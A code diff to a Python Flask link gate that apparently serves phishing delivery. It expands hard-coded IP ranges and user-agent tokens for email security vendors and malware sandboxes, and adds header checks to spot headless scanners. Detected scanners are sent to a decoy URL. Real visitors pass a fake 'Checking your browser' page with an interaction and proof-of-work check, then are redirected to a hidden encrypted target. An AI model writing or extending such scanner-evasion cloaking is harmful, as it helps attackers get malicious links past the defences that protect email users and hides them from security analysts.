@@ -44,7 +44,37 @@ EOP = [
     ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
     ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
 ]
-SCANNER_NETS = {"microsoft_eop": EOP}
+
+PROOFPOINT = [
+    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
+    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
+    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
+    ip_network("62.128.218.0/23"), ip_network("217.146.94.0/23"), 
+    ip_network("217.146.96.0/20"),
+]
+
+GOOGLE_POSTINI = [
+    ip_network("66.102.0.0/20"), ip_network("66.249.64.0/19"),
+    ip_network("72.14.192.0/18"), ip_network("209.85.128.0/17"),
+]
+
+YAHOO_AOL = [
+    ip_network("66.163.160.0/19"), ip_network("74.6.0.0/16"),
+    ip_network("98.136.0.0/15"), ip_network("209.191.64.0/18"),
+]
+
+MIMECAST = [
+    ip_network("91.220.42.0/24"), ip_network("207.211.30.0/23"),
+    ip_network("103.54.228.0/22"),
+]
+
+SCANNER_NETS = {
+    "microsoft_eop": EOP,
+    "proofpoint": PROOFPOINT,
+    "google_postini": GOOGLE_POSTINI,
+    "yahoo_aol": YAHOO_AOL,
+    "mimecast": MIMECAST,
+}
 
 SCANNER_UA_TOKENS = (
     "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", 
@@ -52,6 +82,7 @@ SCANNER_UA_TOKENS = (
     "messagelabs", "trendmicro", "trend micro", "kaspersky", "sophos", "fireeye", 
     "mandiant", "abnormal security", "avanan", "ironscales", "cloudmark", "agari", 
     "valimail", "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
+    "postini", "spam guard", "proprietary",
     "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
     "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
     "intezer", "cape sandbox", "reverse.it", "filescan.io", "urlquery",
@@ -108,10 +139,11 @@ def check_ipinfo(ip: str) -> dict:
         log.error(json.dumps({"event": "ipinfo_error", "ip": ip, "err": str(e)}))
     return {}
 
-def classify(ip: str, ua: str) -> dict:
+def classify(ip: str, ua: str, headers) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
     low = ua.lower()
     
+    # 1. Check UA Tokens (Fast, local)
     for tok in SCANNER_UA_TOKENS:
         if tok in low:
             out["scanner"] = True
@@ -119,6 +151,7 @@ def classify(ip: str, ua: str) -> dict:
             out["method"] = "ua"
             return out
 
+    # 2. Check Static IP Blocks (Fast, local)
     try:
         addr = ip_address(ip)
         for name, nets in SCANNER_NETS.items():
@@ -130,6 +163,21 @@ def classify(ip: str, ua: str) -> dict:
     except ValueError:
         pass
 
+    # 3. Check Headers (Catches headless scanners masking as Chrome)
+    if "chrome" in low or "edge" in low:
+        if "sec-ch-ua" not in headers:
+            out["scanner"] = True
+            out["source"] = "missing_sec_ch_ua"
+            out["method"] = "header"
+            return out
+
+    if "x-ms-exchange-organization" in headers or "x-mimecast" in headers:
+        out["scanner"] = True
+        out["source"] = "scanner_header"
+        out["method"] = "header"
+        return out
+
+    # 4. Fallback: ASN / Hosting check via IPinfo (Slower, external API)
     info = check_ipinfo(ip)
     org = info.get("org", "").upper()
     
@@ -180,6 +228,7 @@ LANDING = """<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex,nofollow">
     <title>Just a moment...</title>
     <style>
         body { 
@@ -242,7 +291,6 @@ LANDING = """<!DOCTYPE html>
         <div class="spinner" id="spinner"></div>
         <h1 id="status-title">Checking your browser before accessing the site.</h1>
         
-        <!-- Subtle Instruction -->
         <div id="instruction" class="instruction-text">
             Please hover your mouse here or tap the screen to continue.
         </div>
@@ -264,18 +312,13 @@ LANDING = """<!DOCTYPE html>
                 interacted = true;
                 document.getElementById('user_interacted').value = 'true';
                 
-                // Change the instruction to green "Verified"
                 const inst = document.getElementById('instruction');
                 inst.className = 'instruction-text verified';
                 inst.textContent = 'Verification successful. Waiting for the site to respond...';
-                
-                // Change the title to match a successful check
                 document.getElementById('status-title').textContent = 'Connection is secure.';
-                // The spinner element is NOT hidden here anymore, so it keeps spinning.
             }
         }
 
-        // Listen for both desktop and mobile interactions
         document.addEventListener('mousemove', markInteraction);
         document.addEventListener('touchstart', markInteraction, {passive: true});
         document.addEventListener('touchmove', markInteraction, {passive: true});
@@ -284,7 +327,6 @@ LANDING = """<!DOCTYPE html>
             const seed = "{{ challenge }}";
             let nonce = 0; let hash = "";
             
-            // Proof of Work loop
             while (!hash.startsWith("0000")) {
                 nonce++;
                 const data = new TextEncoder().encode(seed + nonce);
@@ -294,7 +336,6 @@ LANDING = """<!DOCTYPE html>
             }
             document.getElementById("pow_nonce").value = nonce;
             
-            // Wait 9 seconds before submitting
             setTimeout(() => { 
                 document.getElementById("challenge-form").submit(); 
             }, 9000);
@@ -323,10 +364,9 @@ def landing(token: str):
     if not data or "target" not in data:
         return _static_page("Invalid link", "Could not decrypt target.", 404)
 
-    # Use the unwanted URL from the payload, fallback to env var
     unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
 
-    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
+    tag = classify(client_ip(), request.headers.get("User-Agent", ""), request.headers)
     log.info(json.dumps({"event": "landing_get", **tag}))
 
     if tag["scanner"]:
@@ -344,19 +384,22 @@ def landing(token: str):
     
     is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
     resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
+    
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
+    resp.headers["X-Frame-Options"] = "DENY"
+    resp.headers["X-Content-Type-Options"] = "nosniff"
+    resp.headers["Referrer-Policy"] = "no-referrer"
     return resp
 
 @app.route("/submit/<path:token>", methods=["POST"])
 def execute(token: str):
-    # Decrypt payload early to get the specific unwanted URL for this link
     data = unseal_payload(token)
     if not data or "target" not in data:
-        # If it fails to decrypt, use the default env var
         return redirect(UNWANTED_REDIRECT_URL, code=302)
         
     unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
 
-    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
+    tag = classify(client_ip(), request.headers.get("User-Agent", ""), request.headers)
     
     if tag["scanner"]:
         return redirect(unwanted, code=302)
@@ -391,6 +434,7 @@ def execute(token: str):
 
     resp = make_response(redirect(data["target"], code=303))
     resp.delete_cookie("gate_session", path="/")
+    resp.headers["Cache-Control"] = "no-store"
     return resp
 
 if __name__ == "__main__":
